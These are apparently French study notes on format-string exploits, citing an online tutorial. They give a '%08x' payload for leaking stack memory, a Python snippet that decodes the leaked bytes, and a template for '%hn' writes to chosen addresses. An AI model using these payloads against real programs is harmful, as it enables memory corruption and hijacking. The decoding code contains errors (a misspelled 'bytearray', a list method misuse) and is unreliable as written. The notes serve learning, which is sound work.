# Documentation 

https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html

## Lire en mémoire 


```python 
print('%08x-'*200) #exploit en hex
l=s.split().replace("-"," ") #s=mem exploit 

m=[]
for i in range(len(l)):
        ba=byterray.fromhex(l[i])
        ba.reverse() #big 
        m.append(''.join(format(x,'c') for x in ba))
```

## Ecrire en mémoire 
 
- %n écrit sur 4 bytes-> adresse énorme en hexa 
- on écrit par groupe de 2 bytes avec %hn
- possible d'écrire byte par byte avec %hhn


[adresse écriture low + addresse écriture high]%[hexa low] 
%[n contrôlé]$hn%[hexa high] %[n+1] $hn"')
